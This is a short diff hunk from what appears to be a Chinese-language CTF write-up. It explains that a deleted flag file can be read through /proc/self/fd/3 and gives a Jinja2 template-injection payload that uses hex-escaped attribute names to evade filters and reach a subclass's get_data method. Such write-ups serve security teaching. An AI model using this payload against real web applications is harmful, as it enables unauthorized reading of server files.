@@ -293,4 +293,3 @@ print(encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3',
 由于flag最初是存放在文件中，后由app.py读取后删除了该文件，所以可以利用这一点访问/proc/self/fd/，在其中的3即使此前打开的flag文件。
 
 `{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`
-
